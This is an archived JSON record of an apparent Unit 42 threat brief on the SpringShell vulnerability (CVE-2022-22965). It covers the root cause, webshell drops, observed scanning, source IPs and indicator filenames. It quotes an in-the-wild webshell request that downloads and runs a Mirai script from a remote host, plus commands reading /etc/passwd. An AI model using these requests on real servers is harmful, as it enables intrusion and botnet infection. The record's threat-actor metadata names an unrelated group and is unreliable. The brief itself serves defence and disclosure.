{
    "id": "4c95b97a-2a96-462b-8aa2-d06d3737cbff",
    "created_at": "2023-01-12T15:02:46.563896Z",
    "updated_at": "2025-03-27T02:05:34.213842Z",
    "deleted_at": null,
    "sha1_hash": "c2f6b24743fae4f756a9d404e0dc17713032690b",
    "title": "2022-03-31 - CVE-2022-22965- Spring Core Remote Code Execution Vulnerability Exploited In the Wild (SpringShell)",
    "authors": "",
    "file_creation_date": "2022-05-29T10:47:06Z",
    "file_modification_date": "2022-05-29T10:47:06Z",
    "file_size": 861832,
    "plain_text": "# CVE-2022-22965: Spring Core Remote Code Execution Vulnerability Exploited In the Wild (SpringShell) (Updated)\n\n**[unit42.paloaltonetworks.com/cve-2022-22965-springshell/](https://unit42.paloaltonetworks.com/cve-2022-22965-springshell/)**\n\nHaozhe Zhang, Ken Hsu, Tao Yan, Qi Deng, Robert Falcone March 31, 2022\n\nBy [Haozhe Zhang,](https://unit42.paloaltonetworks.com/author/haozhe-zhang/) [Ken Hsu,](https://unit42.paloaltonetworks.com/author/ken-hsu/) [Tao Yan,](https://unit42.paloaltonetworks.com/author/tao-yan/) [Qi Deng and](https://unit42.paloaltonetworks.com/author/qi-deng/) [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nMarch 31, 2022 at 4:30 PM\n\n[Category: Threat Brief,](https://unit42.paloaltonetworks.com/category/threat-briefs-assessments/threat-brief/) [Vulnerability](https://unit42.paloaltonetworks.com/category/vulnerability/)\n\nTags: [CVE-2022-22963,](https://unit42.paloaltonetworks.com/tag/cve-2022-22963/) [CVE-2022-22965,](https://unit42.paloaltonetworks.com/tag/cve-2022-22965/) [exploit in the wild,](https://unit42.paloaltonetworks.com/tag/exploit-in-the-wild/) [remote code execution,](https://unit42.paloaltonetworks.com/tag/remote-code-execution/)\n[SpringShell](https://unit42.paloaltonetworks.com/tag/springshell/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/cve-2022-22965-springshell/)\n\n## Executive Summary\n\nRecently, two vulnerabilities were announced within the Spring Framework, an open-source\nframework for building enterprise Java applications. On March 29, 2022, the Spring Cloud\n[Expression Resource Access Vulnerability tracked in CVE-2022-22963 was](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22963) [patched with the](https://spring.io/blog/2022/03/29/cve-report-published-for-spring-cloud-function)\nrelease of Spring Cloud Function 3.1.7 and 3.2.3. Two days later on March 31, 2022, Spring\n[released version 5.3.18 and 5.2.20 of Spring Framework to patch another more severe](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)\n[vulnerability tracked in CVE-2022-22965. The CVE-2022-22965 vulnerability allows an](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965)\n\n\n-----\n\nattacker unauthenticated remote code execution (RCE), which Unit 42 has observed being\nexploited in the wild. The exploitation of this vulnerability could result in a webshell being\ninstalled onto the compromised server that allows further command execution.\n\nBecause the Spring Framework is widely used for web system development and the severity\nof the vulnerability is critical (CVSS score of 9.8), CVE-2022-22965 is given the name\nSpringShell (and/or Spring4Shell) by the infosec community. To understand the impact of this\nvulnerability, we analyzed all the available information and located the issue in the source\ncode.\n\nOn April 8, we updated this blog to include statistics on SpringShell exploitation attempts that\nwe identified by analyzing hits on the Spring Core Remote Code Execution Vulnerability\nthreat prevention signature for the Palo Alto Networks Next-Generation Firewall, as well as\nalerts triggered in Cortex XDR. We also added a section on indicators.\n\nPalo Alto Networks customers receive protections against CVE-2022-22965 and CVE-202222963 via products and services including Cortex XDR Prevent and Pro, a Threat Prevention\nsubscription for the Next-Generation Firewall, and Prisma Cloud Compute.\n\nVulnerability Known As SpringShell, Spring4Shell\n\nCVEs Discussed CVE-2022-22965, CVE-2022-22963, CVE-2010-1622\n\nVulnerability Type Remote code execution\n\n## Table of Contents\n\nAffected Software and Versions\n\nBackground on the Spring Framework\n\nRoot Cause Analysis for CVE-2022-22965\n\nBackground on Exploitation of the Class Loader\n\nEstablishing a Reverse Shell Connection to a Remote Server on the Compromised Server\n\nSpringShell Exploit\n\nObserved in the Wild\n\nConclusion\n\nAdditional Resources\n\nIndicators\n\n## Affected Software and Versions\n\nExisting proofs of concept (PoCs) for exploitation work under the following conditions:\n\nJDK 9 or higher\nApache Tomcat as the Servlet container\n\n\n-----\n\nPackaged as a traditional WAR (in contrast to a Spring Boot executable jar)\nspring-webmvc or spring-webflux dependency\nSpring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions\n\nAny Java application using Spring Beans packet (spring-beans-*.jar) and using Spring\nparameters binding could be affected by this vulnerability.\n\n## Background on the Spring Framework\n\nThe Spring Framework is an open-source application framework and inversion of the control\ncontainer for the Java platform. It is widely used in the industry by various programs and\nsystems due to its powerful features and ease of use. Some well-known products such as\nSpring Boot and Spring Cloud are developed with the Spring Framework.\n\nThe Spring Core (spring-core) is the core of the framework that provides powerful features\nsuch as inversion of control and dependency injection. It contains the core, beans, context\nand Spring Expression Language (SpEL) modules.\n\n## Root Cause Analysis for CVE-2022-22965\n\nThe vulnerability is caused by the getCachedIntrospectionResults method of the Spring\nframework wrongly exposing the class object when binding the parameters.\n\nThe default Spring data binding mechanism allows developers to bind HTTP request details\nto application-specific objects. For example, there is a simple classical application scenario\nin which the developer creates a trade object to capture request parameters as shown in\nFigure 1.\n\n\n-----\n\nFigure 1. Example trade object.\nThen the developer creates a controller to use the object trade as shown in Figure 2.\n\nFigure\n\n2. Example controller using the trade object.\nAfter that, the developer usually creates a request builder for the trade controller, which\nallows the web user to access the trade object remotely as shown in Figure 3.\n\nFigure 3. Accessing a normal object.\n\n\n-----\n\nWhen web users access trade object properties, the binding process\n(bindRequestParameters) in the Spring framework implementation will call the\ngetCachedIntrospectionResults method to get and set the object property in the cache.\nHowever, the return object of the getCachedIntrospectionResults method includes a class\nobject. This means that web users can get a class object remotely by simply submitting a\nURL as shown in Figure 4.\n\nFigure 4. Accessing the class object.\n\nExposing the class object to web users is very dangerous and can lead to RCE in many\nways. The class loader is often used by exploiting payloads to load some sensitive classes\ndynamically for object modification and code execution.\n\n### Background on Exploitation of the Class Loader\n\nOne easy way to get RCE is using the exposed class loader to modify the Tomcat log\nconfiguration and remotely upload a JSP web shell after changing the Tomcat log\nconfiguration. One example of changing the Tomcat log configuration by simply submitting a\nURL is shown in Figure 5. This is the exploit method used in the public PoC for the\nSpringShell vulnerability.\n\nFigure 5. Modifying the Tomcat log configuration.\n[Early in 2010, CVE-2010-1622 was assigned to a remote code execution vulnerability in the](https://nvd.nist.gov/vuln/detail/CVE-2010-1622)\nSpring Framework. This vulnerability was due to the lack of proper check on the provided\nPropertyDescriptor in CachedIntrospectionResults() so that class.classLoader is allowed to\nbe utilized to modify the search path of the system's class loader and cause the program to\ninvoke remote Java code. For this vulnerability, the class loader plays a vital role in the\nexploitation.\n\nIn the Spring Framework version 2.5.6.SEC02, the vulnerability was fixed. However, while\nthe original way of obtaining the class loader and exploiting it no longer works, a new feature\nof JDK was introduced in version 9, providing another way to obtain the class loader and\nmaking the exploit possible again.\n\nThe code snippet seen in Figure 6 shows the fix to CVE-2010-1622. The fix is to use a block\nlist to exclude two methods: Class.getClassLoader() and getProtectionDomain() as\nhighlighted in Figure 6. But using a block list runs the risk of being bypassed by the cases\nnot on the list. And the [Java 9 Platform Module System (JPMS) provides a way to bypass](https://www.oracle.com/corporate/features/understanding-java-9-modules.html)\nthis block list.\n\n\n-----\n\nFigure 6. Fix for CVE-2010-1622.\n\n### Establishing a Reverse Shell Connection to a Remote Server on the Compromised Server\n\nThe newly added module property makes it possible to modify the logging configuration so\nthat a JSP webshell can be written into the web host folder via the logging function as shown\nin Figure 7.\n\n\n-----\n\nFigure 7. getModule in JDK 9+\n\nFigure 8 shows the payload drops a password-protected webshell in the Tomcat ROOT\ndirectory called shell7.jsp.\n\nFigure 8. Write a JSP webshell into the web directory.\nAttackers can then invoke any command through the JSP webshell. Figure 9 shows the\nexample of executing Netcat to establish a reverse shell to a remote server on the\ncompromised server.\n\n\n-----\n\nFigure 9. Establish a reverse shell connection with Netcat.\n\n## SpringShell Exploit\n\nExploit code for this remote code execution vulnerability has been made publicly available.\nUnit 42 first observed scanning traffic early on March 30, 2022 with HTTP requests to\nservers that included the test strings within the URL. Figure 10 shows an example of the\nearly scanning activity.\n\nFigure 10. Scanning traffic from PAN-DB cloud logs.\nWhile testing our Threat Prevention signatures, we observed additional scanning activity that\nincluded the exploit code within the data section of the HTTP POST request, as seen in\nFigure 11.\n\n\n-----\n\nFigure 11. Scanning traffic from Threat Prevention signature triggers.\nOnce we deployed the Threat Prevention signatures, we analyzed the packet captures\nassociated with our \"Spring Core Remote Code Execution Vulnerability\" signature and found\nthat a majority of the activity was likely generated by variations of the publicly available PoC\ntools. Our analysis shows that the following filenames would store the webshell contents on\nthe server in the event of successful exploitation:\n\n0xd0m7.jsp\n\nmyshell.jsp\n\nshell.jsp\n\ntomcatwar.jsp\n\nwpz.jsp\n\nThe webshell contents written to these files are very similar to the code included in the\npublicly available PoC as well. There are two variants of the webshell. One was included in\nthe PoC and uses the pwd parameter for authentication (password is always j) and the cmd\nparameter for the command to execute. The second variant does not use a parameter for\nauthentication and uses id for the command to execute. Table 1 shows the parameters that\nthe webshell saved to the server would use for authentication and command and how many\ntimes we saw them.\n\n**URL Parameters** **Authentication** **Command** **Count**\n\n&id=<command> id 337\n\n&pwd=j&cmd=<command> pwd cmd 219\n\n\n-----\n\n_Table 1. Parameters used by webshells seen in hits on Spring Core Remote Code_\n_Execution Vulnerability\" signature._\n\nWe searched our telemetry for activity to webshells using the file names associated with the\nSpringShell activity, with the noted exception of shell.jsp, which is far too general. We have\nseen the unique commands listed below submitted to webshells. Of these, only the two\ncommands involving /etc/passwd would possibly suggest malicious intent for exploitation –\nthe rest of the commands suggest general scanning activity.\n\nls\nnslookup%20[redacted].test6.ggdd[.]co[.]uk\nnslookup+[redacted].test6.ggdd[.]co[.]uk\nping%20[redacted].test6.ggdd[.]co[.]uk\nping+[redacted].test6.ggdd[.]co[.]uk\nwhoami\ncat%20/etc/passwd\ncat+/etc/passwd\nid\nifconfig\nipconfig\nping%20[redacted].burpcollaborator[.]net\n\n## Observed in the Wild\n\nOur Spring Core Remote Code Execution Vulnerability signature was released in the early\nhours of March 31. On April 7, we collected the seven days’ worth of activity since the\nsignature release and found that the signature had triggered 43,092 times. Figure 12 shows\nthe steady increase of total hits from March 31 until April 3, a fairly significant decrease on\nApril 4, followed by an incline in activity on April 5 and 6. At this time, we have yet to confirm\nany successful exploitation attempts that led to a webshell installed onto the server outside\nof testing activity using purposefully vulnerable applications.\n\n\n-----\n\nFigure 12. Chart showing hits per day on the Spring Core Remote Code Execution\nVulnerability signature.\nWe observed a large amount of unique IP addresses during our analysis – with 2,056\naddresses triggering the Spring Core Remote Code Execution Vulnerability signature. Table\n2 shows the top 15 IP addresses seen as the source that triggered our signature, which\naccounts for just over 50% of all of the activity we observed.\n\n**Count** **IP**\n\n4064 172.16.0.0/12\n\n2664 10.0.0.0/8\n\n1680 178.79.148[.]229\n\n1504 82.165.137[.]177\n\n1351 172.104.159[.]48\n\n1336 109.74.204[.]123\n\n1188 5.253.204[.]37\n\n1092 185.245.85[.]232\n\n1090 185.196.3[.]23\n\n1080 172.104.140[.]107\n\n\n-----\n\n1080 207.246.101[.]107\n\n1004 45.33.101[.]246\n\n963 45.33.65[.]249\n\n911 195.246.120[.]148\n\n865 176.125.229[.]145\n\n_Table 2. Top 15 source IPs triggering the Spring Core Remote Code Execution Vulnerability_\n_signature._\n\nWe were able to analyze 31,953 packet captures that triggered the Spring Core Remote\nCode Execution Vulnerability signature to determine the webshell filenames and the webshell\ncontents that would be saved to the server in the event of successful exploitation. In many\ncases, the webshell file names had .jsp extensions, which would allow for a successful\nexploitation to install a working webshell. However, in many cases the filename had an\nextension that would not support a webshell, such as .js and .txt, which we believe was used\njust to mark the presence of a successful file upload as part of vulnerable server discovery\nefforts. At the time of writing, we have observed 95 unique webshell filenames, which we\nhave included in the indicators section.\n\nA majority of the activity used the tomcarwar.jsp filename that was used in the initial PoC\nscript, which accounted for over 57% of the filenames observed. In fact, the top three\nfilenames – tomcarwar.jsp, checkexploit.jsp and javatestfila.jsp – account for over 84% of the\nactivity with known webshell filenames. The pie chart in Figure 13 shows a high-level\nbreakdown of the most common filenames.\n\n\n-----\n\nFigure\n\n13. Pie chart showing the most common webshell file names observed.\nA majority of the packets we analyzed showed the webshell contents did not differ far from\n[the webshell seen in the original proof-of-concept script, which can be seen in Figure 14.](https://github.com/craig/SpringCore0day/blob/main/exp.py)\nAnother very common webshell seen within our telemetry is the exact same with different\nHTTP parameters and values used by the webshell, as seen in Figure 15.\n\nFigure\n\n14. Webshell pattern seen in exploit attempts from original PoC script.\n\nFigure\n\n15. Webshell pattern seen in exploit attempts with slight modifications to original PoC script.\nWe also observed a significant amount of exploit attempts using content that again was a\nmodification of the initial webshell in the proof-of-concept. Figure 16 shows the contents that\nwe observed in the wild, which should not be considered a webshell as it does nothing more\nthan display SPRING_CORE_RCE. The lack of webshell functionality suggests that this is\nlikely uploaded by scanners attempting to discover servers vulnerable to SpringShell.\n\nFigure\n\n16. Pattern seen in exploit attempts used for vulnerable server discovery.\nMore recently, we have seen an uptick in webshell content as seen in Figure 17, which is\n[related to another proof-of-concept script created by K3rwin. This particular webshell will](https://github.com/k3rwin/spring-core-rce/blob/master/spring-core-rce.py)\nload a base64 encoded class that will contain the functionality desired by the actor. This\n\n\n-----\n\n[particular webshell is based on AntSword s](https://github.com/AntSwordProject/AntSword-JSP-Template/blob/master/web/shell.jsp) shell.jsp, which was modified to use a parameter\nof k3rwin instead of ant to load the class.\n\nFigure\n\n17. Webshell pattern seen in exploit attempts from K3rwin’s PoC script.\nThe only malicious activity we have seen in our telemetry related to SpringShell involves\nHTTP requests to URLs containing the tomcatwar.jsp filename associated with the\nSpringShell proof-of-concept script. The activity involved parameters issued to the webshell\nthat would run a command to download and execute a script from a remote server as seen in\nthe following:\n\n[redacted IPV4 address]:8080/tomcatwar.jsp?pwd=j&cmd=/bin/sh/c${IFS}'cd${IFS}/tmp;wget${IFS}hxxp://107.174.133[.]167/t.sh${IFS}-O%a6sh${IFS}SpringCore;'\n\nUpon further analysis, the t.sh script hosted on this remote server is related to the Mirai\nbotnet. The requests above were sent from the IP address  194.31.98[.]186, which itself has\nhosted payloads associated with Mirai as well. Inbound attempts to exploit the SpringShell\nvulnerability from 194.31.98[.]186 attempted to install the webshell from the original proof-ofconcept seen in Figure 14. Our signatures blocked the initial attempt to exploit the\nvulnerability so we cannot confirm if Mirai’s attempts to exploit SpringShell have been\nsuccessful. Both [Netlab 360 and](https://blog.netlab.360.com/what-our-honeypot-sees-just-one-day-after-the-spring4shell-advisory-en/) [Trend Micro also observed Mirai activity related to the](https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html)\nSpringShell vulnerability.\n\nIn addition to our threat prevention signatures, we analyzed the alerts triggered in Cortex\nXDR and found 116 events between April 4 and April 8. A majority of these alerts are\ntriggered by testing of the proof-of-concept tools previously mentioned above. We also\nobserved several alerts involving a docker container named spring4shell, which had a\n/helloworld directory and had a listening port tcp/8080. We believe these docker containers\nare also part of internal testing efforts using publicly available docker containers, such as\n[Spring4Shell-POC. The signature triggered on the creation of the webshell files, of which we](https://github.com/reznok/Spring4Shell-POC)\nobserved the following file written:\n\n/usr/local/tomcat/work/Catalina/localhost/ROOT/org/apache/jsp/shell_jsp.java\n/usr/local/tomcat/webapps/ROOT/shell_.jsp\n\n## Conclusion\n\n\n-----\n\nSpringShell is officially assigned CVE-2022-22965, and the patch was released on March 31,\n2022. Since exploitation is straightforward and all the relevant technical details have already\ngone viral on the internet, it’s possible that SpringShell will become fully weaponized and\nabused on a larger scale. Developers and users who have projects or products based on\nJDK9+ and the Spring Framework (or its derivatives) are strongly urged to patch as soon as\npossible.\n\nWhile CVE-2022-22963 is a different vulnerability in Spring Cloud Function (not technically\npart of SpringShell), a Threat Prevention signature is also available to ensure coverage at\nthe perimeter. Unit 42 researchers are proactively monitoring info related to other recently\ndisclosed Spring vulnerabilities and will proceed to provide coverage as soon as more info\nhas become available.\n\nUnit 42 is actively monitoring malicious traffic through our devices and cloud solutions.\n\nThe Palo Alto Networks Product Security Assurance team is evaluating CVE-2022-22963\nand CVE-2022-22965 as relates to Palo Alto Networks products and currently assigns this a\n[severity of none.](https://security.paloaltonetworks.com/CVE-2022-22963)\n\n[Palo Alto Networks Next-Generation Firewall with a Threat Prevention subscription can block](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention)\nthe attack traffic related to this vulnerability.\n\nCVE-2022-22965 Coverage: Threat IDs 92393 and 92394 (Application and Threat\ncontent update 8551).\nCVE-2022-22963 Coverage: Threat ID 92389 (Application and Threat content update\n8551).\nCommand and control traffic generated by a webshell that is part of SpringShell\nvulnerability exploitation: Threat ID 83239 (Application and Threat content update\n8551).\n\nPalo Alto Networks Prisma Cloud can detect the presence of both CVE-2022-22965 and\n[CVE-2022-22963 across all Compute environments.](https://www.paloaltonetworks.com/prisma/cloud/cloud-workload-protection-platform)\n\nPalo Alto Networks Cortex XDR Prevent and Pro customers running agent version 7.4 and\nabove with content version 450-87751 on Linux devices are protected from CVE-2022-22963\nusing the Java Deserialization module; customers running agent version 7.7 and content 480\nand above are protected from CVE-2022-22963 and CVE-2022-22965 for both Windows and\nLinux using the Java Deserialization module; other OSes and exploits receive protections\nfrom post-exploitation activities using Behavioral Threat Protection, Password Theft\nPrevention, Anti Ransomware and other Anti Exploitation modules. Cortex XDR Pro\ncustomers also have visibility into post-exploitation activities and can specifically track the\n“Process execution with a suspicious command line indicative of the Spring4Shell exploit”\n\n\n-----\n\nand Suspicious HTTP Request to a vulnerable Java class Analytics BIOCs. Furthermore,\ncustomers can create a BIOC from an XQL query looking for the dropped webshell IoCs to\ndetect exploitation attempts in their environments.\n\nPalo Alto Networks Cortex XSOAR customers can leverage the \"Spring Core and Cloud\nFunction SpEL RCEs\" pack to automatically detect and mitigate the vulnerabilities. Read\n[more on the XSOAR marketplace.](https://xsoar.pan.dev/marketplace/details/SpringRCEs)\n\n## Additional Resources\n\nPrisma Cloud Mitigations for SpringShell and Recent Spring Vulnerabilities: CVE-202222963, CVE-2022-22965\n\n[How Cortex XDR Blocks SpringShell Exploits](https://www.paloaltonetworks.com/blog/security-operations/cortex-xdr-springshell/)\n\n## Indicators\n\n### Webshell/log Filename\n\n0808a56a90ca2f8b1e91a1e60b7b451e.txt\n\n0c901fefcae46ba984225aa72df0825c.txt\n\n1532b681733b6bce2ff7252d8890d550.txt\n\n28fcea06661f13ebe9c87327f949f3a8.txt\n\n2b98432e352ff74569b81099dd5ee246.txt\n\n4acbedbe977480d19b7b682d4878cae2.txt\n\n4fdd6fbd220e26b63a7c9a5aa88f5f31.txt\n\n5657e4634210a3d47a789d1389a89320.txt\n\n646bbc2c112070c26b3c042e81c6947e.txt\n\n70b98d30e383df910ce3d693603404fb.txt\n\n73be7d1ef52c3dbc9a5d726288d8a4ba.txt\n\n83d81ef47f0e9a205fb66a100f3179bf.txt\n\n8592f3e430720d324d7cfd7ecd1de521.txt\n\n8697f146477832389449cf2548032ca7.txt\n\nShell.jsp\n\nUJaez.jsp\n\nY4kws.jsp\n\na6bfc76094f689dab978f059ea2456a1.txt\n\naniwvzgvwqnwtehgsfsgbslwoiqkjk.jsp\n\nappli12\n\nbaf24e5f9fc18cf58172d1ba745f0f7a.txt\n\nc41fc8f359d1658559c2d1c0043c76fb.txt\n\ncbsewlaeqsdsqktavziakyzsuwfciu.jsp\n\nczbwzitpzjzkcvkrirybzihsibmuej.jsp\n\nczpdnhpraxgzrtatiuigsalfedwwit.jsp\n\n\n-----\n\ndnuurzjtlbjrnuukwdmaltqrqqlaig.jsp\nduvdqpoyrcapqbfcetgwsqxfkslubw.jsp\nee947d98b91c8ada08f8c15e8f3248fc.txt\nefdde87c66fe4e6dc73a2ab6111ca58a.txt\nfacb4be5385617bf11e6d67f0aa0203b.txt\nggoibjvztvlpelaghjzeweqmopjosz.jsp\ngoocmasqxwfufyxrgyachwidxdotkh.jsp\nhlbpgpqsyracfnvkgrgvlhcptpmdfn.jsp\nhmmyitbecwhmrdicykmfvqlcsknbff.jsp\nhnmqeuzumlokxuhqyekeetrgougeof.jsp\nilvckpgzbrcdljyqdfhqendqcwhgxp.jsp\nizodfyvqujwztweclykgozahdlqvqp.jsp\njynrrkjghebemkrhvfzllrepzosinb.jsp\nkqbnngrfnsxlreajyknuimoamysvwt.jsp\nltcovlwqkckjpuzbqzbjdpkgkakvno.jsp\nmhoqqvpuxdqtuqzmwdrvdeayqvlygb.jsp\nosanxuadyvjaiorcjfqnckfpewunnt.jsp\nptipfhjosfvrfwndwqccapozcbasge.jsp\npxwcqxzrstepmbwufjxuaydkwgmvds.jsp\nqnzfvqpeiljtoyvrywrkuvkrmuewzn.jsp\nrQFlA.jsp\nrmdwahilztwhhqnmcbodkgtbnmrhjx.jsp\ntomcat74935.jsp\nubekdurthzexowlohzgienbwvexynd.jsp\nufoubgkazumxhqvwlnyfejnmyqofcm.jsp\nujpmauuhltvsokjracgwkbflkhhnwo.jsp\nvkmckfvljtpbyowxwhgbjsvyktfdiq.jsp\nxcoihpiouaamtnbqqvcvffyxyrokvn.jsp\nyjjhhdlxepozhirznemjabnsciycvv.jsp\nyutugdqbrossntwaujgxwgrpgczkbd.jsp\nzawpiupzzsjexllfbicrgvlcuxzqyb.jsp\nzqgwtzyrexctiyvsawmwttncwzoyyd.jsp\nzuvuegtemzfsyqjfykowggxpqkuqdp.jsp\n0xd0m7.jsp\ncrashed_log_\ngdGCT.jsp\nmyshell.jsp\nrakesh.jsp\nshei1.jsp\nshell13.jsp\ntomcatlogin.jsp\ndata_theorem_spring4shell_scan.txt\n\n\n-----\n\njarom_h1.jsp\njquery123123123cssbackup7331.jsp\ntomjj.jsp\ntest1.jsp\nhackerone0x.jsp\ninject.jsp\npoc4bugb.jsp\ncuriositysec.jsp\nmynameis0bsecure.jsp\ntomcatwa.jsp\nahmed.txt\ntestqqsg.jsp\nwpz.jsp\nlelel.jsp\nshell.jsp\n07935fdf05b66.jsp\nvulntest-12345.txt\njquerycssv2.js\npoc.jsp\ntomcatspring.jsp\nofc.jsp\nlalalalal.jsp\nsafetytest.txt\nlog.txt\nsafetytest\njavatestfila.jsp\ncheckexploit.jsp\ntomcatwar.jsp\n\n_Updated April 19, 2022, at 7:30 a.m. PT._\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-31 - CVE-2022-22965- Spring Core Remote Code Execution Vulnerability Exploited In the Wild (SpringShell).pdf"
    ],
    "report_names": [
        "2022-03-31 - CVE-2022-22965- Spring Core Remote Code Execution Vulnerability Exploited In the Wild (SpringShell).pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535766,
    "ts_updated_at": 1743041134,
    "ts_creation_date": 1653821226,
    "ts_modification_date": 1653821226,
    "files": {
        "pdf": "https://archive.orkl.eu/c2f6b24743fae4f756a9d404e0dc17713032690b.pdf",
        "text": "https://archive.orkl.eu/c2f6b24743fae4f756a9d404e0dc17713032690b.txt",
        "img": "https://archive.orkl.eu/c2f6b24743fae4f756a9d404e0dc17713032690b.jpg"
    }
}